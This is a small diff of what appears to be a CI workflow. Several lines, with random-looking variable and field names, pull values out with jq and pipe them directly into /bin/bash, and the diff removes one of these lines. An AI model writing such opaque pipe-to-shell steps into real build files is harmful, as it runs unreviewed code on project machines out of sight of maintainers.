@@ -25,7 +25,6 @@ jobs:
           echo $cxon11 | jq -r .qx76890 | /bin/bash
           printf '%s' "$p68697" | jq -r .h930 | /bin/bash
           echo $y720 | jq -r .e8641 | /bin/bash
-          echo $iy063 | jq -r .gmn524 | /bin/bash
           echo $rskl392 | jq -r .cnyq6 | /bin/bash
 
       - name: Archive output
